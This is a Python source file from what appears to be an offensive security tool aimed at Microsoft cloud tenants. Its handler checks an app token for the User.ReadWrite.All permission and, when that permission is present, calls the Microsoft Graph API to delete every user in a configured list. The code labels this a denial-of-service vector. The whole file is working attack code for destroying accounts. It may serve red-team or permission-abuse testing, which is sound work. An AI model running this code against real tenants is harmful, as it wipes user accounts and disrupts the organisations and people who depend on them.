from typing import List
from attacks.handlers.base_handler import AttackHandler, Request, Response
from utils import logger
import requests

logger = logger.createLogger('attacks.handlers.user_rw')


class UserRW_Handler(AttackHandler):
    def handle(self, request: Request,responses:List[Response]):
        # TODO map request.roles to fit with this attack
        if "User.ReadWrite.All" in request.roles:
            status = False
            attack_name = "UserRW_Vectors"
            message = ""
            error = "UserRW_Vectors - failed"

            logger.debug("User.ReadWrite.All - Allows the app to read and write the full set of profile properties, reports, "
            "and managers of other users in your organization, on behalf of the signed-in user.")
        
            logger.info("Try running User.ReadWrite.All on vector: Dos (delete users).")
            
            
            try:
                for user in request.attack_config['UserReadWriteAll']['users']:
                    create_message_URL = "https://graph.microsoft.com/v1.0/users/" + user
                    res = requests.delete(create_message_URL, headers=request.request_headers)
            
                    if res.status_code == 204:
                        status = True
                        message += "Deleted user: %s\n" % user
                
                if message == "":
                    message = error
            except:
                logger.error("Unexpected exception in UserRW_VectorsAttack function")
            
            responses.append(Response(attack_name,request.tenantId,request.appId,status,message))
        
        return super().handle(request,responses)

        





